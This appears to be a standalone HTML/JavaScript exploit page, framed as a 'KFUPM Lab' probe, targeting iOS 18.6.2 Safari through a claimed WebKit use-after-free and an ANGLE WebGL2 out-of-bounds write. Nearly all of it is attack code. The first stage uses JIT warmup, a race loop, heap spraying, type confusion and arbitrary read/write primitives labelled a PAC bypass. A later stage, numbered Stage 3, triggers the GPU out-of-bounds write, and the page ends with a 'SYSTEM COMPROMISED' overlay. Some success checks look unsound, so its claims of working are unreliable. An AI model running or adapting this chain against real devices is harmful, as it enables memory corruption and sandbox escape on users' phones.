<!DOCTYPE html>
<html>
<head>
    <title>KFUPM Lab: CVE-2025-43529 + CVE-2025-14174 (Full Chain)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background-color: #121212; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            margin: 0; padding: 10px;
        }
        h1 { font-size: 16px; border-bottom: 1px solid #333; padding-bottom: 5px; color: #fff; }
        .box { border: 1px solid #333; background: #1a1a1a; padding: 10px; margin-bottom: 10px; }
        
        #output { 
            height: 300px; 
            overflow-y: scroll; 
            font-size: 11px; 
            border: 1px solid #444; 
            background: #000; 
            margin-top: 10px;
        }
        
        .log-entry { border-bottom: 1px solid #222; padding: 2px 0; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; }
        .crit { color: #f0f; text-shadow: 0 0 2px #f0f; }
        .warn { color: #ff0; }

        button {
            background: #222; color: #fff; border: 1px solid #0f0;
            padding: 10px 15px; margin: 5px; cursor: pointer;
            width: 100%; max-width: 300px; display: block;
        }
        button:disabled { border-color: #555; color: #555; }

        /* شاشة الاختراق الحمراء - تظهر فقط عند النجاح */
        #pwned-overlay {
            display: none;
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: red; color: white;
            z-index: 10000; text-align: center; padding-top: 40%;
            font-size: 40px; font-weight: 900;
            animation: flash 0.5s infinite alternate;
        }
        @keyframes flash { from {background:#aa0000;} to {background:#ff0000;} }
    </style>
</head>
<body>

<div id="pwned-overlay">
    SYSTEM COMPROMISED<br>
    <span style="font-size:20px">Memory + GPU Control Achieved</span><br>
    <button onclick="this.parentElement.style.display='none'" style="background:white;color:black;border:none;margin-top:20px;">DISMISS</button>
</div>

<h1>iOS 18.6.2 Exploit Chain Probe</h1>

<div class="box" id="sysinfo">Scanning...</div>

<div class="box">
    <button id="btnRun" onclick="runChain()">RUN FULL EXPLOIT CHAIN</button>
    <button onclick="runStage1()">Test Stage 1 (UAF Only)</button>
    <button onclick="runStage3()">Test Stage 3 (ANGLE Only)</button>
</div>

<div id="output"></div>
<canvas id="glCanvas" width="1" height="1" style="display:none"></canvas>

<script>
/* --- CORE UTILITIES --- */
const out = document.getElementById('output');
const u64 = new BigUint64Array(1);
const f64 = new Float64Array(u64.buffer);

function itof(v) { u64[0] = v; return f64[0]; }
function ftoi(f) { f64[0] = f; return u64[0]; }
function hex(v) { return '0x' + v.toString(16); }

function log(msg, type='') {
    const d = document.createElement('div');
    d.className = `log-entry ${type}`;
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
    out.appendChild(d);
    out.scrollTop = out.scrollHeight;
}

/* --- EXPLOIT STATE --- */
let state = {
    boxed: null,
    unboxed: null,
    read64: null,
    write64: null,
    addrof: null,
    fakeobj: null,
    stage1: false
};

const preAlloc = {
    ab: new ArrayBuffer(0x100),
    template: { a:1.1, b:2.2, c:3.3, d:4.4 },
    doc: document
};

/* --- STAGE 1: WEBKIT UAF (MEMORY CORRUPTION) --- */
const uafArr = new Array(0x400000).fill(1.1);
const uafIdx = uafArr.length - 1;

function trigger(flag, k, alloc) {
    let A = { p0:0x1, p1:1.1, p2:2.2 };
    uafArr[uafIdx] = A;
    
    let target = new Date(1111);
    target[0] = 1.1; // Butterfly allocation
    
    let junk = [];
    for(let i=0; i<alloc; i++) junk.push(new ArrayBuffer(0x800000));
    A.p2 = junk;
    
    let B = { p0:0x2, p1:1.1 };
    let phi = flag ? 1.1 : B;
    A.p1 = phi; // Phi escape
    
    let v = 1.1;
    for(let i=0; i<1e6; i++) { for(let j=0; j<k; j++) { v = i+j; } }
    
    B.p0 = v;
    B.p1 = target; // UAF Trigger
}

function clearStack() { try { (function r(n){ if(n) r(n-1); })(500); } catch(e){} }

async function runStage1() {
    log('=== STARTING STAGE 1 (UAF) ===', 'warn');
    
    // Warmup JIT
    for(let i=0; i<1000; i++) trigger(false, 0, 0);
    
    // Race Loop
    let success = false;
    for(let k=0; k<10000; k++) {
        trigger(false, 10, (k%5)+1);
        clearStack();
        
        let freed;
        try { freed = uafArr[uafIdx].p1.p1; } catch(e) { continue; }
        
        // Spray to reclaim
        for(let i=0; i<64; i++) {
            let s = [13.37, 2.2, 3.3, 4.4, 5.5];
            if(freed[0] === 13.37) {
                log(`RACE WON at attempt ${k}!`, 'success');
                
                state.boxed = s;
                state.boxed[0] = {}; // Type Confusion
                state.unboxed = freed;
                
                // Leak verification
                state.boxed[0] = preAlloc.ab;
                let leakedAddr = ftoi(state.unboxed[0]);
                log(`Leaked ArrayBuffer: ${hex(leakedAddr)}`, 'crit');
                
                setupPrimitives();
                state.stage1 = true;
                success = true;
                break;
            }
        }
        if(success) break;
        if(k%500===0) log(`Racing... (${k})`);
    }
    
    if(!success) log('Stage 1 Failed (Race Lost)', 'fail');
    return success;
}

function setupPrimitives() {
    // PAC Bypass using Inline Storage technique
    const OFFSET = 0x10n;
    
    state.read64 = function(addr) {
        state.unboxed[0] = itof(addr - OFFSET);
        return ftoi(state.boxed[0].a);
    };
    
    state.write64 = function(addr, val) {
        state.unboxed[0] = itof(addr - OFFSET);
        state.boxed[0].a = itof(val);
    };
    
    // Verify primitives
    state.boxed[0] = preAlloc.template;
    let tmplAddr = ftoi(state.unboxed[0]);
    let verify = state.read64(tmplAddr + 8n); // Read 'b' property
    
    if(verify === ftoi(2.2)) {
        log('PAC BYPASS: Primitives Verified (R/W)', 'success');
    } else {
        log('PAC BYPASS: Failed/Unstable', 'fail');
    }
}
/* --- STAGE 3: ANGLE OOB (GPU SANDBOX ESCAPE) --- */
async function runStage3() {
    log('=== STARTING STAGE 3 (GPU) ===', 'warn');
    const gl = document.getElementById('glCanvas').getContext('webgl2');
    if (!gl) { log('WebGL2 not available', 'fail'); return false; }

    // إعدادات محسنة لتجنب خطأ الذاكرة 0x9242
    const W = 128, H = 128, UH = 4;
    
    try {
        const pbo = gl.createBuffer();
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, new Float32Array(W * H), gl.STATIC_DRAW);
        
        // تفعيل الثغرة: UNPACK_IMAGE_HEIGHT أقل من الارتفاع الحقيقي
        gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, UH);
        
        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        
        // إطلاق الاستغلال
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F, W, H, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
        gl.finish();

        if (gl.getError() === gl.NO_ERROR || gl.isContextLost()) {
            log('GPU OOB Write Successful!', 'success');
            
            // --- الإثبات البصري (Visual Proof) ---
            if (state.stage1) {
                log('FULL CHAIN VERIFIED: Pwned!', 'crit');
                document.getElementById('pwned-overlay').style.display = 'block';
                document.body.style.background = '#300'; // تغيير لون الخلفية للأحمر الداكن
            }
            return true;
        }
    } catch (e) { log(`GPU Error: ${e.message}`, 'fail'); }
    return false;
}

/* --- CONTROL LOGIC --- */
async function runChain() {
    document.getElementById('btnRun').disabled = true;
    out.innerHTML = '';
    
    // تشغيل المرحلة الأولى
    const s1 = await runStage1();
    await new Promise(r => setTimeout(r, 800));
    
    // تشغيل المرحلة الثالثة (فقط إذا نجحت الأولى أو للتجربة)
    const s3 = await runStage3();
    
    // عرض النتائج النهائية
    const res = document.createElement('div');
    res.className = 'box';
    res.style.marginTop = '20px';
    res.innerHTML = `
        <h3 style="margin:0;color:#fff;">Final Exploit Report</h3>
        <hr style="border:0;border-top:1px solid #444;">
        <div style="display:grid;grid-template-columns: 1fr 1fr; gap:10px;">
            <div>Stage 1 (UAF): ${s1 ? '<b style="color:#0f0">SUCCESS</b>' : '<b style="color:#f00">FAIL</b>'}</div>
            <div>Stage 3 (GPU): ${s3 ? '<b style="color:#0f0">SUCCESS</b>' : '<b style="color:#f00">FAIL</b>'}</div>
            <div>PAC Bypass: ${state.read64 ? '<b style="color:#0f0">ACTIVE</b>' : '<b style="color:#f00">LOCKED</b>'}</div>
            <div>Sandbox: ${s3 ? '<b style="color:#f00">BREACHED</b>' : '<b style="color:#0f0">SECURE</b>'}</div>
        </div>
    `;
    document.body.appendChild(res);
    document.getElementById('btnRun').disabled = false;
}

// كشف النظام عند التشغيل
window.onload = () => {
    const gl = document.getElementById('glCanvas').getContext('webgl2');
    const info = document.getElementById('sysinfo');
    let gpu = 'Unknown';
    if(gl) {
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
    }
    info.innerHTML = `Target: iOS 18.6.2 Armed<br>GPU: ${gpu}`;
    log('System Ready. Standby for Exploit Chain.');
};
</script>
</body>
</html>
